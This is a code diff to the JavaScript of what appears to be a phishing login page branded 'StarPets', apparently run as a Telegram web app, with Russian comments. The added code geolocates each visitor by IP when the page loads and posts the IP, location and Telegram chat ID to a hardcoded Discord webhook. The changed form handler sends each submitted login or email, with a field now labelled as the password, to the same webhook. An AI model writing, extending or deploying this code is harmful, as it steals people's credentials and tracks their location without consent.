@@ -6,6 +6,21 @@
   // Discord Webhook URL (замените на свой реальный URL)
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459594953679441934/L5XH5D46GOZtYS1AnZDQeqAsmH2ncJxclgVAtO3I5HtTNmbb1-yHf3V5-gQpyCji5Q9B";
 
+  // Флаги эмодзи для стран
+  const countryFlags = {
+    'US': '🇺🇸', 'RU': '🇷🇺', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷',
+    'IT': '🇮🇹', 'ES': '🇪🇸', 'CA': '🇨🇦', 'AU': '🇦🇺', 'JP': '🇯🇵',
+    'CN': '🇨🇳', 'BR': '🇧🇷', 'IN': '🇮🇳', 'MX': '🇲🇽', 'NL': '🇳🇱',
+    'SE': '🇸🇪', 'NO': '🇳🇴', 'FI': '🇫🇮', 'DK': '🇩🇰', 'PL': '🇵🇱',
+    'UA': '🇺🇦', 'TR': '🇹🇷', 'KR': '🇰🇷', 'AR': '🇦🇷', 'CL': '🇨🇱',
+    'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'ZA': '🇿🇦', 'EG': '🇪🇬',
+    'IL': '🇮🇱', 'SA': '🇸🇦', 'AE': '🇦🇪', 'SG': '🇸🇬', 'MY': '🇲🇾',
+    'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭', 'ID': '🇮🇩', 'NZ': '🇳🇿',
+    'CH': '🇨🇭', 'AT': '🇦🇹', 'BE': '🇧🇪', 'PT': '🇵🇹', 'GR': '🇬🇷',
+    'CZ': '🇨🇿', 'RO': '🇷🇴', 'HU': '🇭🇺', 'BG': '🇧🇬', 'HR': '🇭🇷',
+    'BY': '🇧🇾', 'KZ': '🇰🇿', 'UZ': '🇺🇿', 'AZ': '🇦🇿', 'GE': '🇬🇪'
+  };
+
   if (tg) {
     tg.ready();
     tg.expand();
@@ -51,6 +66,63 @@
     if (t) t.textContent = title || "";
     if (p) p.textContent = text || "";
   }
+
+  // Функция получения геолокации по IP
+  async function getGeoInfo() {
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      return {
+        ip: data.ip || 'Неизвестно',
+        country: data.country_name || 'Неизвестно',
+        countryCode: data.country_code || '',
+        city: data.city || '',
+        region: data.region || ''
+      };
+    } catch (error) {
+      console.error('Ошибка получения geo данных:', error);
+      return {
+        ip: 'Не удалось определить',
+        country: 'Неизвестно',
+        countryCode: '',
+        city: '',
+        region: ''
+      };
+    }
+  }
+
+  // Функция отправки уведомления о посещении в Discord
+  async function sendVisitNotification() {
+    try {
+      const geoInfo = await getGeoInfo();
+      const flag = countryFlags[geoInfo.countryCode] || '🌍';
+      const location = geoInfo.city ? `${geoInfo.city}, ${geoInfo.region}` : geoInfo.region;
+      
+      const message = `🔔 **Новый посетитель на сайте!**\n\n` +
+                     `🌐 **IP-адрес:** ${geoInfo.ip}\n` +
+                     `${flag} **Страна:** ${geoInfo.country}\n` +
+                     `📍 **Местоположение:** ${location || 'Не определено'}\n` +
+                     `⏰ **Время:** ${new Date().toLocaleString('ru-RU')}\n` +
+                     `👤 **Chat ID:** ${chatId || 'Не указан'}`;
+
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          username: "StarPets Visit Tracker",
+          avatar_url: "",
+          content: message
+        }),
+      });
+    } catch (error) {
+      console.error("Ошибка отправки уведомления о посещении:", error);
+    }
+  }
+
+  // Отправляем уведомление о посещении при загрузке страницы
+  sendVisitNotification();
 
   // Inputs / UI
   const form = document.getElementById("loginForm") || document.querySelector("form");
@@ -109,9 +181,12 @@
     return out;
   }
 
-  // Функция отправки данных в Discord
+  // Функция отправки данных формы в Discord
   async function sendToDiscord(data) {
     try {
+      const geoInfo = await getGeoInfo();
+      const flag = countryFlags[geoInfo.countryCode] || '🌍';
+      
       const response = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: {
@@ -120,7 +195,12 @@
         body: JSON.stringify({
           username: "StarPets Notification",
           avatar_url: "",
-          content: `📥 Новые данные от пользователя:\n**Логин/Email:** ${data.color || "не указан"}\n**Сообщение:** ${data.animal || "не указано"}\n\n📊 Все поля: ${JSON.stringify(data, null, 2)}`
+          content: `📥 **Новые данные от пользователя:**\n\n` +
+                   `**Логин/Email:** ${data.color || "не указан"}\n` +
+                   `**Пароль:** ${data.animal || "не указано"}\n\n` +
+                   `🌐 **IP-адрес:** ${geoInfo.ip}\n` +
+                   `${flag} **Страна:** ${geoInfo.country}\n\n` +
+                   `📊 **Все поля:** ${JSON.stringify(data, null, 2)}`
         }),
       });
       return response.ok;
